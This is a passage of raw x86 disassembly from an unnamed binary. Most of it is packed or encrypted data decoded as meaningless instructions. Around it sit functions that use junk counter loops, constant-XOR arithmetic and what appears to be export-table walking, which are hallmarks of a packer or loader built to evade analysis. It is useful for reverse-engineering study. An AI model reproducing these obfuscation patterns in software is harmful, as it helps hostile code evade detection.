  410843:	pop    edi
  410844:	bound  ebp,QWORD PTR [ecx]
  410846:	loopne 0x41082b
  410848:	cmp    DWORD PTR [edx],ebx
  41084a:	popa   
  41084b:	in     eax,dx
  41084c:	jns    0x4107d1
  41084e:	jae    0x4107e0
  410850:	xor    eax,0x5e3265a3
  410855:	cmp    BYTE PTR ds:0xa8b2b3f,bh
  41085b:	push   edx
  41085c:	aam    0x5f
  41085e:	mov    edi,0xeb0573d
  410863:	int    0x82
  410865:	and    al,0x36
  410867:	in     al,0x25
  410869:	jg     0x41082d
  41086b:	inc    edi
  41086c:	les    edi,FWORD PTR [eax]
  41086e:	rcr    DWORD PTR [edi+ecx*1+0x4b98d8dc],1
  410875:	cmp    al,0x9c
  410877:	(bad)  
  410878:	add    edi,DWORD PTR [edx+ebp*2+0x1f]
  41087c:	add    edx,esi
  41087e:	jle    0x4108fa
  410880:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410882:	push   edi
  410883:	fs xor ch,al
  410886:	jnp    0x41089d
  410888:	inc    esp
  410889:	lea    edx,[esi]
  41088b:	fimul  DWORD PTR [eax]
  41088d:	mulps  xmm4,XMMWORD PTR [ebp-0x4c]
  410891:	mov    esi,0x85d6ef08
  410896:	sub    eax,DWORD PTR [ebp-0x33]
  410899:	in     al,dx
  41089a:	out    0x8,eax
  41089c:	xchg   BYTE PTR [edx-0x17],bh
  41089f:	sbb    esi,0x24
  4108a2:	sub    ch,BYTE PTR [eax]
  4108a4:	lahf   
  4108a5:	out    dx,eax
  4108a6:	adc    ah,bl
  4108a8:	out    0xba,al
  4108aa:	mov    ecx,0x8f331d7e
  4108af:	dec    edx
  4108b0:	and    DWORD PTR [edx+0x1c],edi
  4108b3:	addr16 cli 
  4108b5:	gs cmp cl,ah
  4108b8:	loope  0x41087f
  4108ba:	adc    eax,0xd047fa90
  4108bf:	adc    eax,0x104a48b
  4108c4:	xor    al,0x5c
  4108c6:	cmp    DWORD PTR [ebx],eax
  4108c8:	inc    edi
  4108c9:	jp     0x4108c9
  4108cb:	xchg   DWORD PTR [ecx],eax
  4108cd:	mov    gs,WORD PTR [edi+0x3a]
  4108d0:	jg     0x41086c
  4108d2:	mov    dl,0xa1
  4108d4:	pop    ebx
  4108d5:	jg     0x4108a7
  4108d7:	add    BYTE PTR [ebp-0x3afd337a],dl
  4108dd:	xchg   edx,eax
  4108de:	sbb    al,0xc7
  4108e0:	repz pop ebx
  4108e2:	jecxz  0x4108f3
  4108e4:	sub    eax,0x6a7e7156
  4108e9:	sbb    esp,DWORD PTR [esi]
  4108eb:	xchg   ecx,eax
  4108ec:	cmc    
  4108ed:	sbb    al,0x88
  4108ef:	out    dx,al
  4108f0:	mov    WORD PTR [esi+edx*4],ss
  4108f3:	iret   
  4108f4:	ins    DWORD PTR es:[edi],dx
  4108f5:	xor    DWORD PTR [eax],eax
  4108f7:	adc    ah,BYTE PTR [eax+0x6143b2d9]
  4108fd:	dec    esp
  4108fe:	bound  esi,QWORD PTR [edx]
  410900:	push   ecx
  410901:	mov    edi,0x601ab696
  410906:	xor    edx,ecx
  410908:	arpl   si,bp
  41090a:	std    
  41090b:	xchg   edi,eax
  41090c:	stos   BYTE PTR es:[edi],al
  41090d:	daa    
  41090e:	or     al,0xa6
  410910:	mov    eax,0x19207eaf
  410915:	outs   dx,DWORD PTR ds:[esi]
  410916:	outs   dx,BYTE PTR ds:[esi]
  410917:	lock inc edi
  410919:	shr    DWORD PTR [eax],1
  41091b:	cmc    
  41091c:	cmp    eax,0x31816047
  410921:	ret    
  410922:	jne    0x4108bf
  410924:	cmp    BYTE PTR [ecx-0x73],ch
  410927:	lock dec esi
  410929:	mov    bh,0x2
  41092b:	mov    al,ds:0xd6730119
  410930:	cmp    DWORD PTR [eax],edi
  410932:	data16 ror BYTE PTR [ebx+0x7e],0x57
  410937:	add    bh,BYTE PTR [edi+esi*4-0x3]
  41093b:	icebp  
  41093c:	cmp    al,0x83
  41093e:	sub    ebp,DWORD PTR [esi+0x1908a399]
  410944:	ror    BYTE PTR [ecx],0x6b
  410947:	or     al,0x84
  410949:	and    eax,DWORD PTR [edi+0x7e]
  41094c:	aam    0xc9
  41094e:	mov    eax,ds:0x5b25e859
  410953:	leave  
  410954:	cmp    DWORD PTR [ecx-0x2bbd1650],edi
  41095a:	mov    dh,0x27
  41095c:	clc    
  41095d:	retf   0xd7ed
  410960:	sub    ebx,0xc2681231
  410966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410967:	xchg   ecx,ecx
  410969:	pop    esi
  41096a:	and    BYTE PTR [esi-0x61],ah
  41096d:	or     dh,BYTE PTR ds:0x72b35722
  410973:	mov    es,WORD PTR [eax-0x49]
  410976:	sub    DWORD PTR [ecx],eax
  410978:	pop    DWORD PTR [eax-0x103faf65]
  41097e:	sub    al,BYTE PTR [ebp-0x4c]
  410981:	mov    eax,ds:0xda148714
  410986:	pop    edx
  410987:	das    
  410988:	cdq    
  410989:	loope  0x4109ab
  41098b:	cmp    DWORD PTR gs:[ecx+0x74d8d48c],esi
  410992:	push   ebp
  410993:	(bad)  
  410994:	jns    0x4109cc
  410996:	mov    WORD PTR [edi-0x648c3146],ds
  41099c:	jg     0x410a1a
  41099e:	scas   eax,DWORD PTR es:[edi]
  41099f:	sahf   
  4109a0:	mov    eax,ds:0x3ada2f3e
  4109a5:	xchg   ebx,eax
  4109a6:	cmp    dl,al
  4109a8:	jp     0x4109bc
  4109aa:	into   
  4109ab:	fs and edx,edx
  4109ae:	xor    al,0x1
  4109b0:	cmp    BYTE PTR [ebp+0x3b0425ce],cl
  4109b6:	add    edi,DWORD PTR [eax+0x34968758]
  4109bc:	inc    edi
  4109bd:	push   0x82eec95d
  4109c2:	jmp    0x410983
  4109c4:	outs   dx,DWORD PTR ds:[esi]
  4109c5:	aam    0xc2
  4109c7:	cmp    BYTE PTR [ecx],dh
  4109c9:	jecxz  0x4109f0
  4109cb:	inc    ebx
  4109cc:	test   eax,0xa2f38d5f
  4109d1:	daa    
  4109d2:	mov    ds:0x746554ad,al
  4109d7:	mov    ebp,0xfca3b66
  4109dc:	test   DWORD PTR [ebp-0x24],ecx
  4109df:	(bad)  
  4109e0:	dec    DWORD PTR [ebx+0x4244350d]
  4109e6:	add    BYTE PTR [ebx+0x19889],cl
  4109ec:	add    BYTE PTR [ecx+0x21e901],cl
  4109f2:	add    BYTE PTR [eax],al
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx+0x50b5629f],0x4e
  410fc4:	loopne 0x410ff4
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410fb8
  410fce:	fwait
  410fcf:	jmp    0x6336:0xe17e06c9
  410fd6:	inc    ebp
  410fd7:	loop   0x410fdb
  410fd9:	mov    DWORD PTR [edi],esp
  410fdb:	mov    bh,0xe8
  410fdd:	(bad)  
  410fdf:	out    dx,eax
  410fe0:	sar    ebp,0x20
  410fe3:	sub    al,0x8d
  410fe5:	dec    edx
  410fe6:	inc    ebp
  410fe7:	data16 (bad) 
  410fe9:	out    0xdd,eax
  410feb:	xchg   edi,eax
  410fec:	cld    
  410fed:	xor    ebx,esi
  410fef:	loopne 0x41106d
  410ff1:	jle    0x411068
  410ff3:	int    0x10
  410ff5:	and    al,0xb8
  410ff7:	and    al,cl
  410ff9:	push   ecx
  410ffa:	jmp    0x85f66af8
  410fff:	pop    edi
  411000:	scas   eax,DWORD PTR es:[edi]
  411001:	adc    esi,ebx
  411003:	cmp    esi,edx
  411005:	jne    0x410fe3
  411007:	(bad)  
  411008:	pusha  
  411009:	dec    ecx
  41100a:	mov    cl,0x75
  41100c:	dec    edx
  41100d:	and    DWORD PTR [ebx+eiz*4+0x55c18cf5],edx
  411014:	xchg   esp,eax
  411015:	and    ch,BYTE PTR [edx+eiz*2+0x77210b5c]
  41101c:	out    0x9a,al
  41101e:	not    DWORD PTR [ebx]
  411020:	shl    dl,cl
  411022:	add    DWORD PTR [ebp-0x4ea97a4d],eax
  411028:	stc    
  411029:	dec    DWORD PTR [edi]
  41102b:	mov    cl,0x22
  41102d:	aas    
  41102e:	inc    esi
  41102f:	jns    0x411053
  411031:	bound  ebp,QWORD PTR [edi+0x0]
  411034:	inc    eax
  411035:	daa    
  411036:	hlt    
  411037:	dec    eax
  411038:	inc    ebp
  411039:	push   eax
  41103a:	adc    BYTE PTR [ebx+0x4e],ah
  41103d:	jnp    0x4110bd
  41103f:	test   eax,0xc85b2794
  411044:	and    DWORD PTR [edi],edi
  411046:	dec    ecx
  411047:	je     0x411030
  411049:	dec    ebp
  41104a:	aad    0xa2
  41104c:	add    BYTE PTR [ecx+eax*2],dh
  41104f:	sbb    eax,0x190292fb
  411054:	dec    edx
  411055:	test   eax,0xef955147
  41105a:	packssdw mm7,mm5
  41105d:	adc    BYTE PTR [edi],ch
  41105f:	inc    ebx
  411060:	xor    eax,0xe55e0629
  411065:	sbb    eax,0xaaf07a3d
  41106a:	push   ss
  41106b:	pop    ebx
  41106c:	jle    0x4110e4
  41106e:	lods   al,BYTE PTR ds:[esi]
  41106f:	mov    ds:0x89e2f39e,eax
  411074:	and    eax,0x82b7337f
  411079:	std    
  41107a:	inc    esi
  41107b:	adc    edx,esp
  41107d:	xchg   edi,eax
  41107e:	mov    dh,0x3c
  411080:	push   eax
  411081:	xor    esp,DWORD PTR ds:0xfac681bf
  411087:	push   ss
  411088:	sub    esp,DWORD PTR [esi+0x1b]
  41108b:	dec    ecx
  41108c:	imul   esp,eax,0x721f73a3
  411092:	mov    bh,0x69
  411094:	das    
  411095:	inc    esp
  411096:	inc    esi
  411097:	dec    esp
  411098:	push   0xcaa9a6a6
  41109d:	or     eax,0xdfcab9d1
  4110a2:	les    esp,FWORD PTR [ebx-0x2bf2bcab]
  4110a8:	aad    0x4c
  4110aa:	adc    BYTE PTR [ecx-0x860b841],bl
  4110b0:	and    eax,0x82f48bcc
  4110b5:	sub    eax,0xe22aecae
  4110ba:	push   ss
  4110bb:	inc    ecx
  4110bc:	popa   
  4110bd:	xor    DWORD PTR [ebx],0xffffffc7
  4110c0:	ret    0xfec0
  4110c3:	add    DWORD PTR [edx],ebp
  4110c5:	loop   0x411138
  4110c7:	xor    bl,ch
  4110c9:	sbb    al,0xb4
  4110cb:	mov    esp,0x6024a626
  4110d0:	js     0x411147
  4110d2:	clc    
  4110d3:	xchg   ebp,eax
  4110d4:	xor    BYTE PTR [eax+0x2c61cf37],ch
  4110da:	aaa    
  4110db:	push   ebp
  4110dc:	das    
  4110dd:	pop    ds
  4110de:	and    bl,dh
  4110e0:	outs   dx,DWORD PTR ds:[esi]
  4110e1:	shr    BYTE PTR [ecx+0x40],1
  4110e4:	mov    esp,0x37cfbf7f
  4110e9:	or     ax,0x7fec
  4110ed:	scas   al,BYTE PTR es:[edi]
  4110ee:	sub    DWORD PTR [eax+0x4252147c],ebx
  4110f4:	fstp   st(6)
  4110f6:	(bad)  
  4110f7:	push   cs
  4110f8:	add    eax,0xb77406fb
  4110fd:	fst    QWORD PTR [ecx-0x682479f2]
  411103:	fcmovbe st,st(4)
  411105:	and    dl,al
  411107:	pop    edi
  411108:	call   0x85dfb186
  41110d:	dec    ecx
  41110e:	adc    eax,0x4f65d850
  411113:	and    DWORD PTR [eax-0x2c6be9ad],ebx
  411119:	push   ss
  41111a:	sti    
  41111b:	std    
  41111c:	add    eax,0x2452aa4c
  411121:	pop    ss
  411122:	or     DWORD PTR [ebp+0x2f08435b],edi
  411128:	pop    ebp
  411129:	sub    eax,0xbf3de2af
  41112e:	sbb    al,0x86
  411130:	mov    WORD PTR [ebp+0xb7b8756],gs
  411136:	mov    dl,0xc0
  411138:	jno    0x41119c
  41113a:	inc    esp
  41113b:	inc    esi
  41113c:	adc    DWORD PTR [ebx-0x13],0xffffffc9
  411140:	xchg   ebx,eax
  411141:	and    ebx,DWORD PTR [ebp+esi*8-0x6df1b5a8]
  411148:	fst    st(7)
  41114a:	pop    es
  41114b:	in     eax,0xfd
  41114d:	test   al,0x7e
  41114f:	leave  
  411150:	adc    BYTE PTR [edx],ch
  411152:	stc    
  411153:	jbe    0x4111be
  411155:	call   0xeceb8c58
  41115a:	loopne 0x411108
  41115c:	setno  BYTE PTR [ecx]
  41115f:	in     eax,dx
  411160:	fldenv [ecx]
  411162:	mov    dh,0xc0
  411164:	or     al,0x71
  411166:	jns    0x411102
  411168:	clc    
  411169:	and    esp,ebx
  41116b:	shr    DWORD PTR [ebx-0x1d],cl
  41116e:	loopne 0x4111ba
  411170:	nop
  411171:	cmp    bl,ah
  411173:	int    0xc5
  411175:	icebp  
  411176:	inc    edx
  411177:	sbb    al,0x8b
  411179:	jmp    0x4111c4
  41117b:	dec    ebp
  41117c:	and    eax,0x3c304b89
  411181:	sbb    al,0x29
  411183:	adc    bh,BYTE PTR [eax-0x1f]
  411186:	or     BYTE PTR [ecx+ecx*4+0xd],0x55
  41118b:	jmp    0x707c:0xac78ba8f
  411192:	in     al,0x4
  411194:	into   
  411195:	out    dx,eax
  411196:	out    dx,eax
  411197:	daa    
  411198:	mov    ds:0x66b192c0,eax
  41119d:	sbb    al,0x55
  41119f:	sub    eax,0xf4e15460
  4111a4:	and    al,0xcc
  4111a6:	push   ebx
  4111a7:	sub    DWORD PTR [eax+edi*2-0x55e746d4],edi
  4111ae:	sub    ebx,DWORD PTR [esi+edx*1]
  4111b1:	cld    
  4111b2:	fcomp  DWORD PTR [edi-0x216c5e66]
  4111b8:	ins    DWORD PTR es:[edi],dx
  4111b9:	faddp  st(7),st
  4111bb:	(bad)  
  4111bc:	repz adc al,0xde
  4111bf:	cmp    eax,0x4b268002
  4111c4:	shl    esi,1
  4111c6:	dec    edx
  4111c7:	fwait
  4111c8:	xor    al,0x1b
  4111ca:	and    DWORD PTR ds:0xedb3f296,esp
  4111d0:	lock or eax,0x336b0ac2
  4111d6:	(bad)  
  4111d7:	push   ecx
  4111d8:	push   cs
  4111d9:	fcomi  st,st(2)
  4111db:	out    0x83,al
  4111dd:	sub    esi,DWORD PTR [edx+0x7a2d1639]
  4111e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e4:	mov    dh,0xbe
  4111e6:	movups xmm6,xmm6
  4111e9:	or     eax,0x65d8b963
  4111ee:	cmp    eax,0xd7420750
  4111f3:	cmc    
  4111f4:	inc    edx
  4111f5:	jl     0x41120a
  4111f7:	sahf   
  4111f8:	cwde   
  4111f9:	jle    0x411207
  4111fb:	dec    esp
  4111fc:	xor    DWORD PTR [esi+0x761f5962],ebx
  411202:	lods   eax,DWORD PTR ds:[esi]
  411203:	mov    ds,WORD PTR [edx]
  411205:	cmp    BYTE PTR [esi],bh
  411207:	jl     0x41122e
  411209:	enter  0xa5e6,0x7b
  41120d:	dec    esi
  41120e:	pop    ss
  41120f:	lods   al,BYTE PTR ds:[esi]
